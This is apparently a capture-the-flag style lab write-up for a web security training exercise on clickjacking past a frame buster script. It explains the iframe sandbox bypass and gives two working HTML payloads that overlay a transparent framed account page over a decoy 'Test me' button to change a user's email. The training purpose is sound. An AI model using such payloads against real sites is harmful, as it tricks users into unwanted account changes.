Title: Clickjacking with a frame buster script
Desc:  This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address?
To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed.
You can log in to your own account using the following credentials: wiener:peter 


# Theory: 
`frame buster` is a script, which want to prevent Clickjacking by for example changing top.location to self.location and escaping from iframe in context of defended site.

An effective attacker workaround against frame busters is to use the HTML5 iframe sandbox attribute. When this is set with the allow-forms or allow-scripts values and the allow-top-navigation value is omitted then the frame buster script can be neutralized as the iframe cannot check whether or not it is the top window:
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>

Both the allow-forms and allow-scripts values permit the specified actions within the iframe but top-level navigation is disabled. This inhibits frame busting behaviors while allowing functionality within the targeted site. 

# Walkthrough:

```
<style>
    iframe {
        position:relative;
        width: 400;
        height: 550;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 456;
        left: 50;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="https://0ac7009004c4d3d5801a449300e00089.web-security-academy.net/my-account?email=test4@gmail.com"></iframe>
```

<img width="822" height="557" alt="image" src="https://github.com/user-attachments/assets/9c76f7b2-c586-47e0-bf16-45f73951806c" />

We have prevention against Clickjacking! We need to bypass this using Theory above:

```
<style>
    iframe {
        position:relative;
        width: 400;
        height: 550;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 456;
        left: 50;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="https://0ac7009004c4d3d5801a449300e00089.web-security-academy.net/my-account?email=test4@gmail.com" sandbox="allow-forms"></iframe>
```

We did it!

